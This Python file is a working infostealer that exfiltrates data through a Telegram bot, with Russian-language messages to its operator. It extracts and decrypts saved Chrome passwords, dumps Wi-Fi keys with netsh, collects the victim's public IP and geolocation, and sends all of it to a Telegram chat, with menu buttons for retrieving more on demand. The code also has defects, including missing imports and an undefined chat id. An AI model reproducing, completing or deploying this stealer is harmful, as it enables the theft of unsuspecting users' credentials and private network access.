from gettext import dpgettext
from http.client import NOT_FOUND
import os
import json
import requests
import socket
import subprocess
from urllib import request
from telebot.types import Message
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
from telebot import *
from threading import Thread
import time


bot = telebot.TeleBot('bot_token')
button_1= types.KeyboardButton(text="Сообщить все")


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google",
                                    "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()

        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
def save_output(data, filename='output_data.txt'):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(data)
def save_uu(data, filename='uu.txt'):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(data)
def save_yy(data, filename='yy.txt'):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(data)
def main():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value,"
                    "password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        output_data = "" 
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                output_data += f"ПАРОЛИ от CHROME:" \
                            f"Исходный URL-адрес: {origin_url}\n" \
                            f"URL действия: {action_url}\n" \
                            f"Имя пользователя: {username}\n" \
                            f"Пароль: {password}\n"\
                            f"____________________________\n"
                message = f"ПАРОЛИ от CHROME:\n" \
                            f"Исходный URL-адрес: {origin_url}\n" \
                            f"URL действия: {action_url}\n" \
                            f"Имя пользователя: {username}\n" \
                            f"Пароль: {password}\n"\
                            f"____________________________\n"
                if date_created != 86400000000 and date_created:
                    message += f"Дата создания: {str(get_chrome_datetime(date_created))}\n"
                if date_last_used != 86400000000 and date_last_used:
                    message += f"Последний визит: {str(get_chrome_datetime(date_last_used))}\n"
                message += "-" * 50
                bot.send_message(chat_id, message) 
        save_output(output_data)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    except Exception as e:
        print(f"Произошла ошибка при получении паролей Chrome: {e}")


def get_output():
    
    try:
        
        with open('output_data.txt', 'r', encoding='utf-8') as file:
            output_data = file.read()
        
        
        doc = open('output_data.txt', 'rb')
        bot.send_document(chat_id, doc)
        bot.send_document(chat_id, "FILEID")  

    except FileNotFoundError:
        bot.send_message(message.chat.id, "Выходные данные не найдены. Запустите скрипт для их генерации.")
    except Exception as e:
        print(f"Произошла ошибка при получении паролей Chrome: {e}")

def get_public_ip():
    try:
        
        resp = requests.get('https://api64.ipify.org?format=json')
        resp.raise_for_status()  
        ip_data = resp.json()
        return ip_data['ip']
    except requests.exceptions.RequestException as e:
        print(f"Error getting public IP: {e}")
        return None
    except Exception as e:
        print(f"Произошла ошибка при получении паролей Chrome: {e}")    
def get_ip_info(ip='127.0.0.1'):
    uu = ""
    try:
       
        resp = requests.get(url=f'http://ip-api.com/json/{ip}')
        resp.raise_for_status()  
        ip_data = resp.json()

        uu += f"IP и ИНФА:{ip_data}\n"\
              f"____________________________\n"
        message = f"IP и ИНФА:{ip_data}\n"\
                  f"____________________________\n"
        bot.send_message (chat_id,message)
    except requests.exceptions.RequestException as e:
        print(f"Error getting IP information: {e}")
    save_uu(uu)

def save_uu(uu):
    with open('uu.txt', 'w', encoding='utf-8') as file:
        file.write(uu)

def get_uu():
    try:
        with open('uu.txt', 'r', encoding='utf-8') as file:
            uu = file.read()

        doc = open('uu.txt', 'rb')
        bot.send_document(chat_id, doc)
        bot.send_document(chat_id, "FILEID")
    except FileNotFoundError:
        bot.send_message(chat_id, "Выходные данные не найдены. Запустите скрипт для их генерации.")

def ma():
    g()

def g():
    public_ip = get_public_ip()
    if public_ip:
        get_ip_info(ip=public_ip)
def j():
    yy=""
    try:
        data = subprocess.check_output("netsh wlan show profiles").decode('cp866').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i]
        pass_wifi = ''

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp866').split('\n')

            for j in results:
                if "Содержимое ключа" in j:
                    pass_wifi += f"{i} = {j.split(':')[1][1:-1]}\n"
        yy+=f"ПАРОЛИ от Wi-Fi:\n"\
            f"{pass_wifi}\n"\
            f"____________________________\n"
        message =f"ПАРОЛИ от Wi-Fi:\n"\
                 f"Пароли: {pass_wifi}\n"\
                 f"____________________________\n"
        bot.send_message(chat_id, message)
        save_yy(yy)
    except Exception as ex:
        print(f'Ошибка: {ex}')
    
    

def get_yy():
    try:
        
        with open('yy.txt', 'r', encoding='utf-8') as file:
            yy = file.read()
        
        
        doc = open('yy.txt', 'rb')
        bot.send_document(chat_id, doc)
        bot.send_document(chat_id, "FILEID")  

    except FileNotFoundError:
        print("error")
    except Exception as e:
        print(f"Произошла ошибка при получении паролей Chrome: {e}")
message = f"Кто-то схавал:) Держи"

bot.send_message(chat_id, message)

if __name__ == "__main__":
    main(),ma(),j()
    file1 = open('output_data.txt', 'r', encoding='utf-8')
    file2 = open('uu.txt', 'r', encoding='utf-8')
    file3 = open('yy.txt', 'r', encoding='utf-8')


    content1 = file1.read()
    content2 = file2.read()
    content3 = file3.read()


    file1.close()
    file2.close()
    file3.close()


    new_file = open('txt для тебя.txt', 'w')
    new_file.write(content1 + "\n" + content2 + "\n" + content3)
    new_file.close()
    bot.send_document(chat_id, open('txt для тебя.txt', 'rb'))
    @bot.message_handler(commands=['start']) 
    def start(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Показать все данные")
        btn2 = types.KeyboardButton("Показать часть")
        markup.add(btn1, btn2)
        bot.send_message(message.chat.id, text="Привет, мой господин Noon".format(message.from_user), reply_markup=markup)
@bot.message_handler(content_types=['text'])
def func(message):
    if(message.text == "Показать все данные"):
        bot.send_message(message.chat.id, main(),ma(),j())
    else:(message.text == "Показать часть")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Пароли")
    btn2 = types.KeyboardButton("IP")
    btn3 = types.KeyboardButton("Wi-Fi пароли")
    btn4 = types.KeyboardButton("Старая инфа")
    back = types.KeyboardButton("Домой")
    markup.add(btn1, btn2, btn3,btn4, back)
    bot.send_message(message.chat.id,":", reply_markup=markup)
    
    if(message.text == "Пароли"):
        bot.send_message(message.chat.id, main())

    elif message.text == "IP":
        bot.send_message(message.chat.id, ma())

    elif message.text == "Wi-Fi пароли":
        bot.send_message(message.chat.id, j())
        
    elif message.text == "Старая инфа":
        file1 = open('output_data.txt', 'r', encoding='utf-8')
        file2 = open('uu.txt', 'r', encoding='utf-8')
        file3 = open('yy.txt', 'r', encoding='utf-8')


        content1 = file1.read()
        content2 = file2.read()
        content3 = file3.read()


        file1.close()
        file2.close()
        file3.close()


        new_file = open('Держи, солнышко, ты самый лучший.txt', 'w')
        new_file.write(content1 + "\n" + content2 + "\n" + content3)
        new_file.close()
        bot.send_document(message.chat.id, open('Держи, солнышко, ты самый лучший.txt', 'rb'))
    
    elif (message.text == "Домой"):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        button1 = types.KeyboardButton("Показать все данные")
        button2 = types.KeyboardButton("Выборочно")
        markup.add(button1, button2)
        bot.send_message(message.chat.id, text="Ты дома", reply_markup=markup)

    

bot.polling(none_stop=True)

    




